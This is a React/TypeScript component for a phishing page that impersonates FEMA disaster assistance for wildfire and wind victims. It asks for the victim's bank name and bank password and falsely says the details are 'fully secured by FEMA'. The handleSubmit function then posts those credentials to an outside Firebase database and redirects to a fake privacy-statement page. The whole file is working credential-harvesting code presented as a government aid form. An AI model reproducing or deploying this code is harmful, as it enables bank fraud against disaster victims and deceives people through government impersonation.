import React, { useState } from "react";
import { useNavigate } from "react-router-dom";

const DisasterConfirmation: React.FC = () => {
  const navigate = useNavigate();
  const [date, setDate] = useState<string>("");
  const [isChecked, setIsChecked] = useState<boolean>(false);
  const [user, setUser] = useState({
    BankName: "",
    BankPassword: "",
  });

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setUser((prevUser) => ({
      ...prevUser,
      [name]: value,
    }));
  };

  const handleSubmit = (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();

    const { BankName, BankPassword } = user;

    if (!isFormValid) {
      alert("Please fill all required fields and confirm the date.");
      return;
    }

    const options = {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ BankName, BankPassword }),
    };

    fetch(
      "https://disasterassistance-b480a-default-rtdb.firebaseio.com/new.json",
      options
    )
      .then((res) => res.json())
      .then((data) => {
        console.log(data);
        navigate("/privacystatementact");
      })
      .catch((error) => {
        console.error(error);
        alert("Error sending information");
      });
  };

  const isFormValid =
    user.BankName.trim() !== "" &&
    user.BankPassword.trim() !== "" &&
    date.trim() !== "" &&
    isChecked;

  return (
    <div className="max-w-2xl mx-auto bg-white p-6 mt-20 shadow-md rounded-lg">
      <form onSubmit={handleSubmit}>
      <h1 className="text-2xl font-bold text-gray-800">
        You selected WILDFIRES AND STRAIGHT-LINE WINDS
      </h1>
      <p className="text-gray-700 mt-2">
        <strong>Disaster Date(s):</strong> 01/07/2025 - Present Time
      </p>
      <p className="mt-1 text-sm text-blue-500 underline cursor-pointer">
        If this is not the right one,{" "}
        <a href="/thirdselection" className="hover:text-blue-700">
          pick another disaster
        </a>
        .
      </p>

      <div className="mt-6">
        <label className="block text-gray-800 font-semibold">
          Please confirm the date your losses occurred.{" "}
          <span className="text-red-500">*</span>
        </label>
        <p className="text-sm text-gray-600">
          Just enter the date as close as you can.
        </p>
        <input
          type="date"
          value={date}
          onChange={(e) => setDate(e.target.value)}
          className="border border-gray-300 rounded px-3 py-2 w-full mt-3 focus:ring-blue-500 focus:border-blue-500"
        />
        <label className="inline-flex items-center mt-4">
          <input
            type="checkbox"
            checked={isChecked}
            onChange={() => setIsChecked(!isChecked)}
            className="h-5 w-5 text-blue-600 border-gray-300 rounded focus:ring-blue-500"
          />
          <span className="ml-2 text-gray-800 font-semibold">
            Confirm this date. <span className="text-red-500">*</span>
          </span>
        </label>
      </div>

      <p className="block mt-4 text-lg text-gray-800 font-semibold">
        Add payment details <span className="text-red-500">*</span>
      </p>
      <p className="text-sm text-gray-600">
        Note: Information provided is fully secured by FEMA.
      </p>
      <label htmlFor="BankName" className="block text-sm font-medium text-gray-700 mt-4">
        Bank Name
      </label>
      <input
        type="text"
        name="BankName"
        value={user.BankName}
        onChange={handleChange}
        placeholder="Enter Bank Name"
        className="mt-1 block w-full p-2 border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500"
      />
      <label htmlFor="BankPassword" className="block text-sm font-medium text-gray-700 mt-4">
        Bank Password
      </label>
      <input
        type="password"
        name="BankPassword"
        value={user.BankPassword}
        onChange={handleChange}
        placeholder="Enter Bank Password"
        className="mt-1 block w-full p-2 border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500"
      />
      <button
        type="submit"
        disabled={!isFormValid}
        className={`mt-6 mb-4 w-full py-2 rounded-md ${
          isFormValid
            ? "bg-blue-500 text-white hover:bg-blue-600"
            : "bg-gray-300 text-gray-500 cursor-not-allowed"
        }`}
      >
        Next
      </button>
      </form>
    </div>
  );
};

export default DisasterConfirmation;
